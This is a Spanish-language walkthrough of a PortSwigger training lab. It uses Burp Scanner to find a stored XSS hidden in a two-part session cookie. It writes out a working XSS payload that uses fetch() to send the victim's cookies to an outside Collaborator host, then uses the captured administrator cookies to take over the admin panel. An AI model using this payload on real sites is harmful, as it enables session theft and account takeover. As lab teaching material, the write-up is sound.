---
title: "Scanning non-standard data structures"
description: "Laboratorio de Portswigger sobre Essential Skills"
date: 2024-12-08 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Essential Skills
tags:
  - Portswigger Labs
  - Essential Skills
  - Scanning non-standard data structures
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `vulnerabilidad` que es difícil de encontrar `manualmente`. Se encuentra en una `estructura de datos no estándar`. Para `resolver` el laboratorio, debemos usar la función `Scan selected insertion point` de `Burp Scanner` para identificar la `vulnerabilidad`, luego `explotarla` manualmente y eliminar al `usuario carlos`. Podemos `iniciar sesión` en nuestra propia cuenta utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/Essential-Skills-Lab-2/image_1.png)

Pulsamos en `My account` y nos `logueamos` con las credenciales `wiener:peter`

![](/assets/img/Essential-Skills-Lab-2/image_2.png)

`Recargamos` con `F5` y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/Essential-Skills-Lab-2/image_3.png)

El `formato` de la `cookie` es bastante `extraño`

```
session=wiener:zqEeGuTsB0x4zgTkv5Pl3BDpMbM4KYDL
```

Si la `estructura` de `datos` fuera `estándar`, es decir que tuviera `un solo campo` podríamos `marcar todo el dato` de forma `completa` de esta manera

```
session=zqEeGuTsB0x4zgTkv5Pl3BDpMbM4KYDL
```

![](/assets/img/Essential-Skills-Lab-2/image_4.png)

Sin embargo, en este caso, parece que se trata de dos `estructuras de datos` diferentes. Por ello, no tendría sentido manejarlo de esta manera, ya que `Burpsuite` enviaría un único `payload` para toda la `estructura`. En estos casos, o cuando trabajamos con un `JSON`, lo mejor es `enviar` la `petición` al `Intruder`, establecer `puntos de inserción` (insertion points) en cada `dato` y escanear los valores de manera `independiente` y no como un `único bloque`. Cuando se abra la nueva `ventana` en `Burp Intruder`, debemos pulsar en `OK` y comenzará el `escaneo`

![](/assets/img/Essential-Skills-Lab-2/image_5.png)

Si nos vamos a `Dashboard` veremos que nos ha `detectado` un `XSS`, aunque ponga `audit finished` necesitaremos `esperar` un poco `más` de `tiempo` para que nos `muestre` lo que ha `encontrado`

![](/assets/img/Essential-Skills-Lab-2/image_6.png)

Este es el `payload` que vamos a usar ahora para `obtener` la `cookie`, debemos usar `Burpsuite Collaborator` para que nos mande ahí las `peticiones`

```
Cookie: session='"><svg/onload=fetch(`//ird4jrrnt2mjjytc1bdncj4v8mee24qt.oastify.com/${encodeURIComponent(document.cookie)}`)>:gzUjX1PEjSeUz0hi59YqWXwVpEiCHt9x
```

Para `encodear` el `payload` de la misma forma en la que está, debemos usar el `inspector` de `Burpsuite`, el cual se `encargará` de `encodearlo` de la misma forma en la que está el anterior

![](/assets/img/Essential-Skills-Lab-2/image_7.png)

Una vez `enviada` la `petición`, nos llega esto a `Burpsuite Collaborator`

![](/assets/img/Essential-Skills-Lab-2/image_8.png)

El `inspector` de `Burpsuite` lo `decodea` por nosotros y vemos que estas son las `cookies` del usuario `administrator`

![](/assets/img/Essential-Skills-Lab-2/image_9.png)

```
/session=administrator:iwnc8XhMT4HzCj2ScdD2qDuwKRG7AJhD; secret=jPNSk5gKjLbTQaTMWbYl81pU2rTtXufm; session=administrator:iwnc8XhMT4HzCj2ScdD2qDuwKRG7AJhD
```

Nos vamos al navegador y pulsamos `Ctrl + Shift + i` y vemos que tenemos varios `campos` de `cookies`

![](/assets/img/Essential-Skills-Lab-2/image_10.png)

`Sustituimos` los `campos` de `cookies` y pulsamos `F5` para `refrescar` la `web`

![](/assets/img/Essential-Skills-Lab-2/image_11.png)

Ya tenemos `acceso` al `panel` de `administrador` y podemos `eliminar` al usuario `carlos`

![](/assets/img/Essential-Skills-Lab-2/image_12.png)

Vemos que hay una parte llamada `View Logs`, aquí es donde se ha producido el `XSS` debido a que el usuario `administrator` se encontraba `revisándolo`

![](/assets/img/Essential-Skills-Lab-2/image_13.png)
